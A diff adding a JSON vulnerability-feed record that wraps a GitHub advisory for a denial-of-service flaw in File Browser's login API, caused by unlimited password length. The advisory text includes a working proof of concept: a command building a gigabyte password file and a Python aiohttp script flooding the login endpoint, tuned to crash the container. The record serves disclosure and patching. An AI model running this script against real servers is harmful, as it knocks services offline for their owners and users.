@@ -1,0 +1,59 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/123664304?v=4\", \"events_url\": \"https://api.github.com/users/AshrafIbrahim03/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/AshrafIbrahim03/followers\", \"following_url\": \"https://api.github.com/users/AshrafIbrahim03/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/AshrafIbrahim03/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/AshrafIbrahim03\", \"id\": 123664304, \"login\": \"AshrafIbrahim03\", \"node_id\": \"U_kgDOB173sA\", \"organizations_url\": \"https://api.github.com/users/AshrafIbrahim03/orgs\", \"received_events_url\": \"https://api.github.com/users/AshrafIbrahim03/received_events\", \"repos_url\": \"https://api.github.com/users/AshrafIbrahim03/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/AshrafIbrahim03/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/AshrafIbrahim03/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/AshrafIbrahim03\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-54092\", \"cvss\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 6.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 8.7, \"vector_string\": \"CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:H/SC:N/SI:N/SA:N\"}}, \"cwes\": [{\"cwe_id\": \"CWE-400\", \"name\": \"Uncontrolled Resource Consumption\"}, {\"cwe_id\": \"CWE-1284\", \"name\": \"Improper Validation of Specified Quantity in Input\"}], \"description\": \"### Summary\\nUnchecked passwords maximums allow for an arbitrarily large password to be passed into the login API. This spikes CPU and memory, and after testing, crashes, heavily lags any container created, and has even made my docker daemon start to send errors with status code 500 even after the container was destroyed.\\n\\n### Details\\nWhen sending JSON in the body of the request to the route `api/login`, if a large password is sent, there is no checking on a maximum length password. This means that any length string can be sent to the server and it will be hashed. Specifically the function `CheckPwd` in `users/password.go` is called to hash and check to see if the user supplied password is valid, but there is no maximum length for the password checked in that function. Depending on how many concurrent requests are being made, there may be no logs about the failed login attempts.\\n\\n### PoC\\nCreate a file with a large password using this command:\\n```bash\\nyes \\\"thisisalongphraseithinksoyeahitisactuallyimsureitiswhatisthisisamouthwoahimcoolwheredidthiscomefromwowza\\\" | head -n 10000000 > large-password.txt\\n```\\nThis makes a file that's about a gigabyte. The `n` parameter in the head function can be adjusted to increase or decrease the file size. Afterwards, run the following script to make a filebrowser container:\\n```bash\\ndocker run -v filebrowser_data:/srv -v filebrowser_database:/database -v filebrowser_config:/config -p 8080:80 filebrowser/filebrowser\\n```\\n\\nAfter running the container, it is recommended to bring up some sort of performance dashboard on the container that is running to monitor CPU and memory usage. Afterwards, run the following Python script (make sure to install dependencies: `pip install aiohttp asyncio `). The `CONCURRENT_REQUESTS` parameter controls the number of requests to be making at one time. The `TOTAL_REQUESTS` parameter controls the grand total number of requests sent to the targeted container. If one wants more severe results, turn it up. If one wants less severe results, turn it down. The setting it's on right now is where I've found it can either crash the targeted container or just make it lag until it doesn't respond but is still on.\\n\\n```python\\nimport aiohttp\\nimport asyncio\\nfrom time import perf_counter\\n\\nurl = 'http://localhost:8080/api/login'\\nCONCURRENT_REQUESTS = 30\\nTOTAL_REQUESTS = 1000\\nasync def make_request(session, body, semaphore):\\n    async with semaphore:\\n        try:\\n            async with session.post(url, json=body) as response:\\n                print(response.status)\\n        except asyncio.TimeoutError:\\n            print('Request timed out')\\n        except aiohttp.ConnectionTimeoutError:\\n            print('Request timed out')\\n        except Exception as e:\\n            print(f\\\"Unexpected error {e}\\\")\\n\\nasync def main():\\n    with open(\\\"./large-password.txt\\\", \\\"r\\\") as f:\\n        file_contents = f.read()\\n\\n    body = {\\n        \\\"username\\\": \\\"admin\\\",\\n        \\\"password\\\": file_contents,\\n        \\\"recaptcha\\\": \\\"\\\"\\n    }\\n\\n    headers = {\\\"Content-Type\\\": \\\"application/json\\\"}\\n    semaphore = asyncio.Semaphore(CONCURRENT_REQUESTS)\\n\\n    async with aiohttp.ClientSession(headers=headers) as session:\\n        tasks = [\\n            make_request(session, body, semaphore)\\n            for _ in range(TOTAL_REQUESTS)  \\n        ]\\n\\n        start = perf_counter()\\n        await asyncio.gather(*tasks)\\n        end = perf_counter()\\n\\n        print(f\\\"Completed {len(tasks)} requests in {end - start:.2f} seconds\\\")\\n\\nif __name__ == \\\"__main__\\\":\\n    asyncio.run(main())\\n```\\n\\n### Impact\\nThe vulnerability impacts anyone who uses this service.\", \"epss\": {\"percentage\": 0.00484, \"percentile\": 0.385}, \"ghsa_id\": \"GHSA-w5fm-68j4-fpc4\", \"github_reviewed_at\": \"2026-06-12T21:51:24Z\", \"html_url\": \"https://github.com/advisories/GHSA-w5fm-68j4-fpc4\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-w5fm-68j4-fpc4\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-54092\"}], \"nvd_published_at\": null, \"published_at\": \"2026-06-12T21:51:24Z\", \"references\": [\"https://github.com/filebrowser/filebrowser/security/advisories/GHSA-w5fm-68j4-fpc4\", \"https://github.com/filebrowser/filebrowser/commit/847d08bdd135e5c3659f2e6dea2f0cd36617af9b\", \"https://github.com/filebrowser/filebrowser/releases/tag/v2.63.6\", \"https://github.com/advisories/GHSA-w5fm-68j4-fpc4\"], \"repository_advisory_url\": \"https://api.github.com/repos/filebrowser/filebrowser/security-advisories/GHSA-w5fm-68j4-fpc4\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/filebrowser/filebrowser\", \"summary\": \"File Browser has a DoS Vulnerability via Public Login API\", \"type\": \"reviewed\", \"updated_at\": \"2026-06-12T21:51:25Z\", \"url\": \"https://api.github.com/advisories/GHSA-w5fm-68j4-fpc4\", \"vulnerabilities\": [{\"first_patched_version\": \"2.63.6\", \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/filebrowser/filebrowser/v2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 2.63.5\"}, {\"first_patched_version\": null, \"package\": {\"ecosystem\": \"go\", \"name\": \"github.com/filebrowser/filebrowser\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 1.11.0\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-w5fm-68j4-fpc4",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "github.com/filebrowser/filebrowser/v2: <= 2.63.5",
+      "github.com/filebrowser/filebrowser: <= 1.11.0"
+    ],
+    "authentication_required": true,
+    "cves": [
+      "CVE-2026-54092"
+    ],
+    "cvss_score": 6.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "github.com/filebrowser/filebrowser",
+      "github.com/filebrowser/filebrowser/v2"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:51:58.920406Z",
+  "provenance": {
+    "content_sha256": "dc24fa490caec164ed4175108a687d02591df02770262ee9094878f2ef1ce4c1",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-06-12T21:51:24Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-w5fm-68j4-fpc4",
+  "status": "active",
+  "title": "File Browser has a DoS Vulnerability via Public Login API",
+  "updated_at": "2026-06-12T21:51:25Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-w5fm-68j4-fpc4"
+}
